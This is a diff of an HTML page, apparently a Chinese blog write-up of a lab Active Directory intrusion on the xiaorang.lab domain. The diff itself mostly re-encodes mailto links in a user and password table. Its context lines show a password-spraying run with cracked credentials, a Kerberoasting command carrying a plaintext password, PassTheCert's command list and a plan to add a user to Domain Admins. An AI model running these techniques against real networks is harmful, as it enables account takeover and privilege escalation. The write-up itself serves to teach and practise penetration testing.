@@ -228,25 +228,25 @@
 <tbody><tr>
 <td>1</td>
 <td>huangmin</td>
-<td><a href="mailto:&#x68;&#x75;&#x61;&#x6e;&#103;&#109;&#x69;&#110;&#64;&#120;&#x69;&#x61;&#111;&#x72;&#97;&#110;&#103;&#x2e;&#x6c;&#97;&#98;">huangmin@xiaorang.lab</a></td>
+<td><a href="mailto:&#104;&#117;&#97;&#x6e;&#103;&#x6d;&#105;&#110;&#x40;&#x78;&#105;&#x61;&#x6f;&#114;&#97;&#110;&#103;&#46;&#108;&#97;&#x62;">huangmin@xiaorang.lab</a></td>
 <td>admin</td>
 </tr>
 <tr>
 <td>2</td>
 <td>zhangrong</td>
-<td><a href="mailto:&#x7a;&#x68;&#97;&#x6e;&#x67;&#x72;&#111;&#x6e;&#x67;&#64;&#x78;&#105;&#x61;&#x6f;&#114;&#x61;&#110;&#103;&#x2e;&#x6c;&#97;&#98;">zhangrong@xiaorang.lab</a></td>
+<td><a href="mailto:&#x7a;&#104;&#97;&#x6e;&#103;&#x72;&#111;&#x6e;&#x67;&#x40;&#120;&#x69;&#x61;&#x6f;&#x72;&#x61;&#x6e;&#103;&#x2e;&#x6c;&#x61;&#98;">zhangrong@xiaorang.lab</a></td>
 <td>i9XDE02pLVf</td>
 </tr>
 <tr>
 <td>3</td>
 <td>liying</td>
-<td><a href="mailto:&#x6c;&#105;&#x79;&#105;&#x6e;&#103;&#64;&#120;&#x69;&#x61;&#x6f;&#x72;&#97;&#x6e;&#x67;&#x2e;&#108;&#97;&#98;">liying@xiaorang.lab</a></td>
+<td><a href="mailto:&#x6c;&#105;&#x79;&#105;&#x6e;&#103;&#x40;&#120;&#105;&#97;&#x6f;&#114;&#x61;&#110;&#x67;&#x2e;&#108;&#x61;&#98;">liying@xiaorang.lab</a></td>
 <td>6N70jt2K9sV</td>
 </tr>
 <tr>
 <td>4</td>
 <td>zhaoli</td>
-<td><a href="mailto:&#x7a;&#x68;&#97;&#x6f;&#108;&#x69;&#x40;&#120;&#x69;&#x61;&#x6f;&#x72;&#x61;&#x6e;&#103;&#x2e;&#108;&#97;&#98;">zhaoli@xiaorang.lab</a></td>
+<td><a href="mailto:&#122;&#104;&#97;&#111;&#x6c;&#105;&#64;&#x78;&#x69;&#97;&#x6f;&#114;&#x61;&#x6e;&#103;&#x2e;&#x6c;&#x61;&#98;">zhaoli@xiaorang.lab</a></td>
 <td>fiAzGwEMgTY</td>
 </tr>
 </tbody></table>
@@ -275,6 +275,7 @@
 <p>3 个密码 × 309 个用户 &#x3D; 927 个组合，每个用户只试 3 次，压着 AD 的锁定阈值走。<br>跑之前我还嘴硬：「肯定一个都不中。」</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q /root/.local/share/pipx/venvs/impacket/bin/python /root/spray.py</span><br><span class="line">[*] 927 combos</span><br><span class="line">[+] zhangjian:i9XDE02pLVf</span><br><span class="line">[+] liupeng:fiAzGwEMgTY</span><br></pre></td></tr></table></figure>
 <p>两分钟，两个账号。牛魔。</p>
+<p><img src="/img/obsidian/2bf4ec2dcb5c347d.jpg" alt="file-20261110020747166.jpg" loading='lazy'></p>
 <h2 id="3-5-Kerberoasting"><a href="#3-5-Kerberoasting" class="headerlink" title="3.5 Kerberoasting"></a>3.5 Kerberoasting</h2><p>直接用 <code>zhangjian</code> 做 Kerberoast</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/root/.local/bin</span><br><span class="line">proxychains4 -q GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -outputfile /root/kerb.txt</span><br><span class="line"><span class="built_in">cat</span> /root/kerb.txt</span><br></pre></td></tr></table></figure>
 <p><img src="/img/obsidian/686e302a3cd7ebf0.png" alt="file-20261110003104744.png" loading='lazy'></p>
@@ -328,11 +329,8 @@
 <td><code>set_rbcd</code></td>
 <td>为目标机器配置 RBCD</td>
 </tr>
-<tr>
-<td>先看一下这玩意可以干嘛</td>
-<td></td>
-</tr>
 </tbody></table>
+<p>先看一下这玩意可以干嘛</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">help</span></span></span><br><span class="line"></span><br><span class="line"> add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.</span><br><span class="line"> rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.</span><br><span class="line"> add_user new_user [parent] - Creates a new user.</span><br><span class="line"> add_user_to_group user group - Adds a user to a group.</span><br><span class="line"> change_password user [password] - Attempt to change a given user&#x27;s password. Requires LDAPS.</span><br><span class="line"> clear_rbcd target - Clear the resource based constrained delegation configuration information.</span><br><span class="line"> clear_shadow_creds target - Clear shadow credentials on the target (sAMAccountName).</span><br><span class="line"> disable_account user - Disable the user&#x27;s account.</span><br><span class="line"> enable_account user - Enable the user&#x27;s account.</span><br><span class="line"> dump - Dumps the domain.</span><br><span class="line"> search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.</span><br><span class="line"> get_user_groups user - Retrieves all groups this user is a member of.</span><br><span class="line"> get_group_users group - Retrieves all members of a group.</span><br><span class="line"> get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).</span><br><span class="line"> grant_control [search_base] target grantee - Grant full control on a given target object (sAMAccountName or search filter, optional search base) to the grantee (sAMAccountName).</span><br><span class="line"> set_dontreqpreauth user true/false - Set the don&#x27;t require pre-authentication flag to true or false.</span><br><span class="line"> set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).</span><br><span class="line">set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).</span><br><span class="line"> start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.</span><br><span class="line"> write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by &#123;&#125;.</span><br><span class="line"> whoami - get connected user</span><br><span class="line"> dirsync - Dirsync requested attributes</span><br><span class="line"> exit - Terminates this session.</span><br><span class="line"> remove_user_from_group user group - Removes a user from a group.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>有 <code>add_user_to_group</code> 就够了——把 <code>zhangxia</code> 直接加进域管组</p>
 <h3 id="3-9-1-提权"><a href="#3-9-1-提权" class="headerlink" title="3.9.1 提权"></a>3.9.1 提权</h3><p>在 PassTheCert shell 里：</p>
